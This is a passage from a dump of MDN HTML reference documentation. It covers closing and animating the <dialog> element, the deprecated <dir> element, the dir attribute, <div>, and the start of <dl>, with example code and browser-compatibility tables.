dialog</button>\n</p>\n<output></output>\n```\n\n#### JavaScript\n\njs\n\n```\nconst showButton = document.getElementById(\"showDialog\");\nconst favDialog = document.getElementById(\"favDialog\");\nconst outputBox = document.querySelector(\"output\");\nconst selectEl = favDialog.querySelector(\"select\");\nconst confirmBtn = favDialog.querySelector(\"#confirmBtn\");\n\n// \"Show the dialog\" button opens the <dialog> modally\nshowButton.addEventListener(\"click\", () => {\n  favDialog.showModal();\n});\n\n// \"Cancel\" button closes the dialog without submitting because of [formmethod=\"dialog\"], triggering a close event.\nfavDialog.addEventListener(\"close\", (e) => {\n  outputBox.value =\n    favDialog.returnValue === \"default\"\n      ? \"No return value.\"\n      : `ReturnValue: ${favDialog.returnValue}.`; // Have to check for \"default\" rather than empty string\n});\n\n// Prevent the \"confirm\" button from the default behavior of submitting the form, and close the dialog with the `close()` method, which triggers the \"close\" event.\nconfirmBtn.addEventListener(\"click\", (event) => {\n  event.preventDefault(); // We don't want to submit this fake form\n  favDialog.close(selectEl.value); // Have to send the select box value here.\n});\n```\n\n#### Result\n\nThe above examples demonstrate the following three methods of closing modal dialogs:\n\n- By submitting the form within the dialog form using the `dialog` method (as seen in the [HTML-only example](#html-only_dialog)).\n- By pressing the Esc key.\n- By calling the [`HTMLDialogElement.close()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/close) method (as seen in the [modal example](#creating_a_modal_dialog)). In this example, the \"Cancel\" button closes the dialog via the `dialog` form method and the \"Confirm\" button closes the dialog via the [`HTMLDialogElement.close()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/close) method.\n\nThe \"Cancel\" button includes the [`formmethod=\"dialog\"`](input/submit#formmethod) attribute, which overrides the [`<form>`](form)'s default [`GET`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET) method. When a form's method is [`dialog`](#usage_notes), the state of the form is saved but not submitted, and the dialog gets closed.\n\nWithout an `action`, submitting the form via the default [`GET`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET) method causes a page to reload. We use JavaScript to prevent the submission and close the dialog with the [`event.preventDefault()`](https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault) and [`HTMLDialogElement.close()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/close) methods, respectively.\n\nIt is important to provide a closing mechanism within every `dialog` element. The Esc key does not close non-modal dialogs by default, nor can one assume that a user will even have access to a physical keyboard (e.g., someone using a touch screen device without access to a keyboard).\n\n### Closing a dialog with a required form input\n\nWhen a form inside a dialog has a required input, the user agent will only let you close the dialog once you provide a value for the required input. To close such dialog, either use the [`formnovalidate`](input#formnovalidate) attribute on the close button or call the `close()` method on the dialog object when the close button is clicked.\n\nhtml\n\n```\n<dialog id=\"dialog\">\n  <form method=\"dialog\">\n    <p>\n      <label>\n        Favorite animal:\n        <input type=\"text\" required />\n      </label>\n    </p>\n    <div>\n      <input type=\"submit\" id=\"normal-close\" value=\"Normal close\" />\n      <input\n        type=\"submit\"\n        id=\"novalidate-close\"\n        value=\"Novalidate close\"\n        formnovalidate />\n      <input type=\"submit\" id=\"js-close\" value=\"JS close\" />\n    </div>\n  </form>\n</dialog>\n<p>\n  <button id=\"show-dialog\">Show the dialog</button>\n</p>\n<output></output>\n```\n\n#### JavaScript\n\njs\n\n```\nconst showBtn = document.getElementById(\"show-dialog\");\nconst dialog = document.getElementById(\"dialog\");\nconst jsCloseBtn = dialog.querySelector(\"#js-close\");\n\nshowBtn.addEventListener(\"click\", () => {\n  dialog.showModal();\n});\n\njsCloseBtn.addEventListener(\"click\", (e) => {\n  e.preventDefault();\n  dialog.close();\n});\n```\n\n#### Result\n\nFrom the output, we see it is impossible to close the dialog using the *Normal close* button. But the dialog can be closed if we bypass the form validation using the `formnovalidate` attribute on the *Cancel* button. Programmatically, `dialog.close()` will also close such dialog.\n\n### Animating dialogs\n\n`<dialog>`s are set to [`display: none;`](https://developer.mozilla.org/en-US/docs/Web/CSS/display) when hidden and `display: block;` when shown, as well as being removed from / added to the [top layer](https://developer.mozilla.org/en-US/docs/Glossary/Top_layer) and the [accessibility tree](https://developer.mozilla.org/en-US/docs/Web/Performance/How_browsers_work#building_the_accessibility_tree). Therefore, for `<dialog>` elements to be animated the [`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display) property needs to be animatable. [Supporting browsers](https://developer.mozilla.org/en-US/docs/Web/CSS/display#browser_compatibility) animate `display` with a variation on the [discrete animation type](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_animated_properties#discrete). Specifically, the browser will flip between `none` and another value of `display` so that the animated content is shown for the entire animation duration.\n\nSo for example:\n\n- When animating `display` from `none` to `block` (or another visible `display` value), the value will flip to `block` at `0%` of the animation duration so it is visible throughout.\n- When animating `display` from `block` (or another visible `display` value) to `none`, the value will flip to `none` at `100%` of the animation duration so it is visible throughout.\n\n**Note:** When animating using [CSS transitions](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_transitions), [`transition-behavior: allow-discrete`](https://developer.mozilla.org/en-US/docs/Web/CSS/transition-behavior) needs to be set to enable the above behavior. This behavior is available by default when animating with [CSS animations](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_animations); an equivalent step is not required.\n\n#### Transitioning dialog elements\n\nWhen animating `<dialog>`s with CSS transitions, the following features are required:\n\n[`@starting-style`](https://developer.mozilla.org/en-US/docs/Web/CSS/@starting-style) at-rule  \nProvides a set of starting values for properties set on the `<dialog>` that you want to transition from every time it is opened. This is needed to avoid unexpected behavior. By default, CSS transitions only occur when a property changes from one value to another on a visible element; they are not triggered on elements' first style updates, or when the `display` type changes from `none` to another type.\n\n[`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display) property  \nAdd `display` to the transitions list so that the `<dialog>` will remain as `display: block` (or another visible `display` value set on the dialog's open state) for the duration of the transition, ensuring the other transitions are visible.\n\n[`overlay`](https://developer.mozilla.org/en-US/docs/Web/CSS/overlay) property  \nInclude `overlay` in the transitions list to ensure the removal of the `<dialog>` from the top layer is deferred until the transition completes, again ensuring the transition is visible.\n\n[`transition-behavior`](https://developer.mozilla.org/en-US/docs/Web/CSS/transition-behavior) property  \nSet `transition-behavior: allow-discrete` on the `display` and `overlay` transitions (or on the [`transition`](https://developer.mozilla.org/en-US/docs/Web/CSS/transition) shorthand) to enable discrete transitions on these two properties that are not by default animatable.\n\nHere is a quick example to show what this might look like.\n\n##### HTML\n\nThe HTML contains a `<dialog>` element, plus a button to show the dialog. Additionally, the `<dialog>` element contains another button to close itself.\n\nhtml\n\n```\n<dialog id=\"dialog\">\n  Content here\n  <button class=\"close\">close</button>\n</dialog>\n\n<button class=\"show\">Show Modal</button>\n```\n\n##### CSS\n\nIn the CSS, we include a `@starting-style` block that defines the transition starting styles for the `opacity` and `transform` properties, transition end styles on the `dialog[open]` state, and default styles on the default `dialog` state to transition back to once the `<dialog>` has appeared. Note how the `<dialog>`'s `transition` list includes not only these properties, but also the `display` and `overlay` properties, each with `allow-discrete` set on them.\n\nWe also set a starting style value for the [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) property on the [`::backdrop`](https://developer.mozilla.org/en-US/docs/Web/CSS/::backdrop) that appears behind the `<dialog>` when it opens, to provide a nice darkening animation. The `dialog[open]::backdrop` selector selects only the backdrops of `<dialog>` elements when the dialog is open.\n\ncss\n\n```\n/*   Open state of the dialog  */\ndialog[open] {\n  opacity: 1;\n  transform: scaleY(1);\n}\n\n/*   Closed state of the dialog   */\ndialog {\n  opacity: 0;\n  transform: scaleY(0);\n  transition:\n    opacity 0.7s ease-out,\n    transform 0.7s ease-out,\n    overlay 0.7s ease-out allow-discrete,\n    display 0.7s ease-out allow-discrete;\n  /* Equivalent to\n  transition: all 0.7s allow-discrete; */\n}\n\n/*   Before-open state  */\n/* Needs to be after the previous dialog[open] rule to take effect,\n    as the specificity is the same */\n@starting-style {\n  dialog[open] {\n    opacity: 0;\n    transform: scaleY(0);\n  }\n}\n\n/* Transition the :backdrop when the dialog modal is promoted to the top layer */\ndialog::backdrop {\n  background-color: rgb(0 0 0 / 0%);\n  transition:\n    display 0.7s allow-discrete,\n    overlay 0.7s allow-discrete,\n    background-color 0.7s;\n  /* Equivalent to\n  transition: all 0.7s allow-discrete; */\n}\n\ndialog[open]::backdrop {\n  background-color: rgb(0 0 0 / 25%);\n}\n\n/* This starting-style rule cannot be nested inside the above selector\nbecause the nesting selector cannot represent pseudo-elements. */\n\n@starting-style {\n  dialog[open]::backdrop {\n    background-color: rgb(0 0 0 / 0%);\n  }\n}\n```\n\n##### JavaScript\n\nThe JavaScript adds event handlers to the show and close buttons causing them to show and close the `<dialog>` when they are clicked:\n\njs\n\n```\nconst dialogElem = document.getElementById(\"dialog\");\nconst showBtn = document.querySelector(\".show\");\nconst closeBtn = document.querySelector(\".close\");\n\nshowBtn.addEventListener(\"click\", () => {\n  dialogElem.showModal();\n});\n\ncloseBtn.addEventListener(\"click\", () => {\n  dialogElem.close();\n});\n```\n\n##### Result\n\nThe code renders as follows:\n\n**Note:** Because `<dialog>`s change from `display: none` to `display: block` each time they are shown, the `<dialog>` transitions from its `@starting-style` styles to its `dialog[open]` styles every time the entry transition occurs. When the `<dialog>` closes, it transitions from its `dialog[open]` state to the default `dialog` state.\n\nIt is possible for the style transition on entry and exit to be different in such cases. See our [Demonstration of when starting styles are used](https://developer.mozilla.org/en-US/docs/Web/CSS/@starting-style#demonstration_of_when_starting_styles_are_used) example for a proof of this.\n\n#### dialog keyframe animations\n\nWhen animating a `<dialog>` with CSS keyframe animations, there are some differences to note from transitions:\n\n- You don't provide a `@starting-style`.\n- You include the `display` value in a keyframe; this will be the `display` value for the entirety of the animation, or until another non-`none` display value is encountered.\n- You don't need to explicitly enable discrete animations; there is no equivalent to `allow-discrete` inside keyframes.\n- You don't need to set `overlay` inside keyframes either; the `display` animation handles the animation of the `<dialog>` from shown to hidden.\n\nLet's have a look at an example so you can see what this looks like.\n\n##### HTML\n\nFirst, the HTML contains a `<dialog>` element, plus a button to show the dialog. Additionally, the `<dialog>` element contains another button to close itself.\n\nhtml\n\n```\n<dialog id=\"dialog\">\n  Content here\n  <button class=\"close\">close</button>\n</dialog>\n\n<button class=\"show\">Show Modal</button>\n```\n\n##### CSS\n\nThe CSS defines keyframes to animate between the closed and shown states of the `<dialog>`, plus the fade-in animation for the `<dialog>`'s backdrop. The `<dialog>` animations include animating `display` to make sure the actual visible animation effects remain visible for the whole duration. Note that it wasn't possible to animate the backdrop fade out — the backdrop is immediately removed from the DOM when the `<dialog>` is closed, so there is nothing to animate.\n\ncss\n\n```\ndialog {\n  animation: fade-out 0.7s ease-out;\n}\n\ndialog[open] {\n  animation: fade-in 0.7s ease-out;\n}\n\ndialog[open]::backdrop {\n  animation: backdrop-fade-in 0.7s ease-out forwards;\n}\n\n/* Animation keyframes */\n\n@keyframes fade-in {\n  0% {\n    opacity: 0;\n    transform: scaleY(0);\n    display: none;\n  }\n\n  100% {\n    opacity: 1;\n    transform: scaleY(1);\n    display: block;\n  }\n}\n\n@keyframes fade-out {\n  0% {\n    opacity: 1;\n    transform: scaleY(1);\n    display: block;\n  }\n\n  100% {\n    opacity: 0;\n    transform: scaleY(0);\n    display: none;\n  }\n}\n\n@keyframes backdrop-fade-in {\n  0% {\n    background-color: rgb(0 0 0 / 0%);\n  }\n\n  100% {\n    background-color: rgb(0 0 0 / 25%);\n  }\n}\n\nbody,\nbutton {\n  font-family: system-ui;\n}\n```\n\n##### JavaScript\n\nFinally, the JavaScript adds event handlers to the buttons to enable showing and closing the `<dialog>`:\n\njs\n\n```\nconst dialogElem = document.getElementById(\"dialog\");\nconst showBtn = document.querySelector(\".show\");\nconst closeBtn = document.querySelector(\".close\");\n\nshowBtn.addEventListener(\"click\", () => {\n  dialogElem.showModal();\n});\n\ncloseBtn.addEventListener(\"click\", () => {\n  dialogElem.close();\n});\n```\n\n##### Result\n\nThe code renders as follows:\n\n## Technical summary\n\n|                                             |                                                                                                          |\n|---------------------------------------------|----------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [sectioning root](heading_elements#sectioning_roots) |\n| Permitted content                           | [Flow content](../content_categories#flow_content)                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                    |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content)                              |\n| Implicit ARIA role                          | [dialog](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/dialog_role)              |\n| Permitted ARIA roles                        | [`alertdialog`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/alertdialog_role)  |\n| DOM interface                               | [`HTMLDialogElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement)                |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `dialog` | 37      | 79   | 98      | 24    | 15.4   | 37             | 98                  | 24            | 15.4          | 3.0              | 37              |     |\n| `open`   | 37      | 79   | 98      | 24    | 15.4   | 37             | 98                  | 24            | 15.4          | 3.0              | 37              |     |\n\n## See also\n\n- [`HTMLDialogElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement) interface\n- [`close`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/close_event) event\n- [`cancel`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/cancel_event) event\n- [`open`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/open) property of the `HTMLDialogElement` interface\n- [`inert`](../global_attributes/inert) global attribute for HTML elements\n- [`::backdrop`](https://developer.mozilla.org/en-US/docs/Web/CSS/::backdrop) CSS pseudo-element\n- [Web forms](https://developer.mozilla.org/en-US/docs/Learn/Forms) in the Learn area\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dialog](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dialog)"
- name: dir
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<dir\\>: The Directory element\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<dir>` [HTML](../index) element is used as a container for a directory of files and/or folders, potentially with styles and icons applied by the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent). Do not use this obsolete element; instead, you should use the [`<ul>`](ul) element for lists, including lists of files.\n\n**Warning:** Do not use this element. Though present in early HTML specifications, it has been deprecated in HTML 4, and has since been removed entirely.\n\n## DOM interface\n\nThis element implements the `HTMLDirectoryElement` interface.\n\n## Attributes\n\nLike all other HTML elements, this element supports the [global attributes](../global_attributes).\n\n[`compact`](#compact) Deprecated  \nThis Boolean attribute hints that the list should be rendered in a compact style. The interpretation of this attribute depends on the user agent and it doesn't work in all browsers.\n\n## Specifications\n\nNot part of any current specifications.\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `dir`     | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n| `compact` | 1       | 12   | 1       | ≤12.1 | ≤4     | 18             | 4                   | ≤12.1         | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- Other list-related HTML Elements: [`<ol>`](ol), [`<ul>`](ul), [`<li>`](li), and [`<menu>`](menu);\n- CSS properties that may be specially useful to style the `<dir>` element:\n  - The [`list-style`](https://developer.mozilla.org/en-US/docs/Web/CSS/list-style) property, useful to choose the way the ordinal is displayed.\n  - [CSS counters](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_counter_styles/Using_CSS_counters), useful to handle complex nested lists.\n  - The [`line-height`](https://developer.mozilla.org/en-US/docs/Web/CSS/line-height) property, useful to simulate the deprecated [`compact`](#compact) attribute.\n  - The [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) property, useful to control the indent of the list.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dir](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dir)"
- name: dir (attribute)
  summary: The dir global attribute is an enumerated attribute that indicates the directionality of the element's text
  description: "# dir\n\nThe `dir` [global attribute](../global_attributes) is an [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute that indicates the directionality of the element's text.\n\n## Try it\n\n#### HTML Demo: dir\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p dir=\"rtl\">This paragraph is in English but incorrectly goes right to left.</p>\n    <p dir=\"ltr\">This paragraph is in English and correctly goes left to right.</p>\n\n    <hr />\n\n    <p>هذه الفقرة باللغة العربية ولكن بشكل خاطئ من اليسار إلى اليمين.</p>\n    <p dir=\"auto\">هذه الفقرة باللغة العربية ، لذا يجب الانتقال من اليمين إلى اليسار.</p>\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nIt can have the following values:\n\n- `ltr`, which means *left to right* and is to be used for languages that are written from the left to the right (like English);\n- `rtl`, which means *right to left* and is to be used for languages that are written from the right to the left (like Arabic);\n- `auto`, which lets the user agent decide. It uses a basic algorithm as it parses the characters inside the element until it finds a character with a strong directionality, then applies that directionality to the whole element.\n\n**Note:** This attribute is mandatory for the [`<bdo>`](../element/bdo) element where it has a different semantic meaning.\n\n- This attribute is *not* inherited by the [`<bdi>`](../element/bdi) element. If not set, its value is `auto`.\n- This attribute can be overridden by the CSS properties [`direction`](https://developer.mozilla.org/en-US/docs/Web/CSS/direction) and [`unicode-bidi`](https://developer.mozilla.org/en-US/docs/Web/CSS/unicode-bidi), if a CSS page is active and the element supports these properties.\n- As the directionality of the text is semantically related to its content and not to its presentation, it is recommended that web developers use this attribute instead of the related CSS properties when possible. That way, the text will display correctly even on a browser that doesn't support CSS or has the CSS deactivated.\n- The `auto` value should be used for data with an unknown directionality, like data coming from user input, eventually stored in a database.\n\n**Note:** Browsers might allow users to change the directionality of [`<input>`](../element/input) and [`<textarea>`](../element/textarea)s in order to assist with authoring content. Chrome and Safari provide a directionality option in the contextual menu of input fields while Legacy Edge uses the key combinations Ctrl + Left Shift and Ctrl + Right Shift. Firefox uses Ctrl/Cmd + Shift + X but does NOT update the `dir` attribute value.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `dir` | 1       | 79   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- All [global attributes](../global_attributes).\n- [`HTMLElement.dir`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dir) that reflects this attribute.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/dir](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/dir)"
- name: dirname (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`dirname`](attributes/dirname)

    [`<input>`](element/input), [`<textarea>`](element/textarea)
- name: disabled (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`disabled`](attributes/disabled)

    [`<button>`](element/button), [`<fieldset>`](element/fieldset), [`<input>`](element/input), [`<optgroup>`](element/optgroup), [`<option>`](element/option), [`<select>`](element/select), [`<textarea>`](element/textarea)

    Indicates whether the user can interact with the element.
- name: div
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<div\\>: The Content Division element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fdiv&level=high)\n\nThe `<div>` [HTML](../index) element is the generic container for flow content. It has no effect on the content or layout until styled in some way using [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS) (e.g. styling is directly applied to it, or some kind of layout model like [Flexbox](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_flexible_box_layout) is applied to its parent element).\n\n## Try it\n\n#### HTML Demo: \\<div\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <div class=\"warning\">\n      <img src=\"/media/examples/leopard.jpg\" alt=\"An intimidating leopard.\" />\n      <p>Beware of the leopard</p>\n    </div>\n\n    .warning {\n      border: 10px ridge #f00;\n      background-color: #ff0;\n      padding: 0.5rem;\n      display: flex;\n      flex-direction: column;\n    }\n\n    .warning img {\n      width: 100%;\n    }\n\n    .warning p {\n      font: small-caps bold 1.2rem sans-serif;\n      text-align: center;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nAs a \"pure\" container, the `<div>` element does not inherently represent anything. Instead, it's used to group content so it can be easily styled using the [`class`](../global_attributes#class) or [`id`](../global_attributes#id) attributes, marking a section of a document as being written in a different language (using the [`lang`](../global_attributes#lang) attribute), and so on.\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n**Note:** The `align` attribute is obsolete; do not use it anymore. Instead, you should use CSS properties or techniques such as [CSS Grid](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_grid_layout) or [CSS Flexbox](https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Flexbox) to align and position `<div>` elements on the page.\n\n## Usage notes\n\n- The `<div>` element should be used only when no other semantic element (such as [`<article>`](article) or [`<nav>`](nav)) is appropriate.\n\n## Accessibility\n\nThe `<div>` element has [an implicit role of `generic`](https://www.w3.org/TR/wai-aria-1.2/#generic), and not none. This may affect certain ARIA combination declarations that expect a direct descendant element with a certain role to function properly.\n\n## Examples\n\n### A simple example\n\nhtml\n\n```\n<div>\n  <p>\n    Any kind of content here. Such as &lt;p&gt;, &lt;table&gt;. You name it!\n  </p>\n</div>\n```\n\n#### Result\n\n### A styled example\n\nThis example creates a shadowed box by applying a style to the `<div>` using CSS. Note the use of the [`class`](../global_attributes#class) attribute on the `<div>` to apply the style named `\"shadowbox\"` to the element.\n\n#### HTML\n\nhtml\n\n```\n<div class=\"shadowbox\">\n  <p>Here's a very interesting note displayed in a lovely shadowed box.</p>\n</div>\n```\n\n#### CSS\n\ncss\n\n```\n.shadowbox {\n  width: 15em;\n  border: 1px solid #333;\n  box-shadow: 8px 8px 5px #444;\n  padding: 8px 12px;\n  background-image: linear-gradient(180deg, #fff, #ddd 40%, #ccc);\n}\n```\n\n#### Result\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `div`   | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n| `align` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n## See also\n\n- Semantic sectioning elements: [`<section>`](section), [`<article>`](article), [`<nav>`](nav), [`<header>`](header), [`<footer>`](footer)\n- [`<span>`](span) element for styling of phrasing content\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/div](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/div)"
- name: dl
  summary: The <dl> HTML element represents a description list
  description: "# \\<dl\\>: The Description List element\n\nThe `<dl>` [HTML](../index) element represents a description list. The element encloses a list of groups of terms (specified using the [`<dt>`](dt) element) and descriptions (provided by [`<dd>`](dd) elements). Common uses for this element are to implement a glossary or to display metadata (a list of key-value pairs).\n\n## Try it\n\n#### HTML Demo: \\<dl\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Cryptids of Cornwall:</p>\n\n    <dl>\n      <dt>Beast of Bodmin</dt>\n      <dd>A large feline inhabiting Bodmin Moor.</dd>\n\n      <dt>Morgawr</dt>\n      <dd>A sea serpent.</dd>\n\n      <dt>Owlman</dt>\n      <dd>A giant owl-like creature.</dd>\n    </dl>\n\n    p,\n    dt {\n      font-weight: bold;\n    }\n\n    dl,\n    dd {\n      font-size: 0.9rem;\n    }\n\n    dd {\n      margin-bottom: 1em;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Accessibility\n\nEach screen reader exposes `<dl>` content differently, including total count, terms/definitions context, and navigation methods. These differences are not necessarily bugs. As of iOS 14, VoiceOver will announce that `<dl>` content is a list when navigating with the virtual cursor (not via the read-all command). VoiceOver does not support list navigation commands with `<dl>`. Be careful applying ARIA `term` and `definition` roles to `<dl>` constructs as VoiceOver (macOS and iOS) will adjust how they are announced.\n\n- [VoiceOver on iOS 14 Supports Description Lists](https://adrianroselli.com/2020/09/voiceover-on-ios-14-supports-description-lists.html)\n- [Brief Note on Description List Support](https://adrianroselli.com/2022/12/brief-note-on-description-list-support.html)\n\n## Examples\n\n### Single term and description\n\nhtml\n\n```\n<dl>\n  <dt>Firefox</dt>\n  <dd>\n    A free, open source, cross-platform, graphical web browser developed by the\n    Mozilla Corporation and hundreds of volunteers.\n  </dd>\n\n  <!-- Other terms and descriptions -->\n</dl>\n```\n\n#### Result\n\n### Multiple terms, single description\n\nhtml\n\n```\n<dl>\n  <dt>Firefox</dt>\n  <dt>Mozilla Firefox</dt>\n  <dt>Fx</dt>\n  <dd>\n    A free, open source, cross-platform, graphical web browser developed by the\n    Mozilla Corporation and hundreds of volunteers.\n  </dd>\n\n  <!-- Other terms and descriptions -->\n</dl>\n```\n\n#### Result\n\n### Single term, multiple descriptions\n\nhtml\n\n```\n<dl>\n  <dt>Firefox</dt>\n  <dd>\n    A free, open source, cross-platform, graphical web browser developed by the\n    Mozilla Corporation and hundreds of volunteers.\n  </dd>\n  <dd>\n    The Red Panda also known as the Lesser Panda, Wah, Bear Cat or Firefox, is a\n    mostly herbivorous mammal, slightly larger than a domestic cat (60 cm long).\n  </dd>\n\n  <!-- Other terms and descriptions -->\n</dl>\n```\n\n#### Result\n\n### Multiple terms and descriptions\n\nIt is also possible to define multiple terms with multiple corresponding descriptions, by combining the examples above.\n\n### Metadata\n\nDescription lists are useful for displaying metadata as a list of key-value pairs.\n\nhtml\n\n```\n<dl>\n  <dt>Name</dt>\n  <dd>Godzilla</dd>\n  <dt>Born</dt>\n  <dd>1952</dd>\n  <dt>Birthplace</dt>\n  <dd>Japan</dd>\n  <dt>Color</dt>\n  <dd>Green</dd>\n</dl>\n```\n\n#### Result\n\nTip: It can be handy to define a key-value separator in the CSS, such as:\n\ncss\n\n```\ndt::after {\n  content: \": \";\n}\n```\n\n### Wrapping name-value groups in `div` elements\n\nHTML allows wrapping each name-value group in a `<dl>` element in a [`<div>`](div) element. This can be useful when using [microdata](../microdata), or when [global attributes](../global_attributes) apply to a whole group, or for styling purposes.\n\nhtml\n\n```\n<dl>\n  <div>\n    <dt>Name</dt>\n    <dd>Godzilla</dd>\n  </div>\n  <div>\n    <dt>Born</dt>\n    <dd>1952</dd>\n  </div>\n  <div>\n    <dt>Birthplace</dt>\n    <dd>Japan</dd>\n  </div>\n  <div>\n    <dt>Color</dt>\n    <dd>Green</dd>\n  </div>\n</dl>\n```\n\n#### Result\n\n## Notes\n\nDo not use this element (nor [`<ul>`](ul) elements) to merely create indentation on a page. Although it works, this is a bad practice and obscures the meaning of description lists.\n\nTo change the indentation of a description term, use the [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) property.\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|      | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|      | Chrome  | Edge | 